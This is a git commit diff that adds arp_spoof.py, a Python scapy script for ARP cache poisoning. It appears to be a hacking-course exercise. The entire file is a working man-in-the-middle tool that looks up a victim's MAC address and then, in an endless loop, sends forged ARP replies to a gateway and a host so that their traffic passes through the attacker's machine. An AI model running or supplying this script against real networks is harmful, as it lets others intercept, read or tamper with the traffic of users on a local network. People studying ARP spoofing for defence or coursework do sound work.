0b422e818205679b797c6dfed2c2e23ca71bcfbb
Saif <155953162+Soku124@users.noreply.github.com>
2026-07-05 10:38:55 +0530

    Update arp_spoof.py

--- arp_spoofer/arp_spoof.py
+++ arp_spoofer/arp_spoof.py
@@ -1,3 +1,45 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import time
+
+
+def get_mac(target_ip):
+    arp_request = scapy.ARP(pdst=target_ip)
+
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+
+    arp_request_broadcast = broadcast/arp_request
+
+    answeres_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answeres_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+
+    target_mac_address = get_mac(target_ip=target_ip)
+    packet = scapy.ARP(op=2, 
+                       pdst=target_ip,
+                       hwdst=target_mac_address, 
+                       psrc=spoof_ip,
+                       ) # sending response to the gatway telling that 192.168.0.1 has kali machine mac address to redirect traffic
+
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet, verbose=False)
+
+sent_packet_count=0         
+
+try:
+    while True:
+        spoof("192.168.0.1","192.168.0.105")
+        spoof("192.168.0.105","192.168.0.1")
+        sent_packet_count+=2
+        print("\r[+] Packets Sent: "+str(sent_packet_count), end="")
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C ..... Quitting.")
+
 
 
 
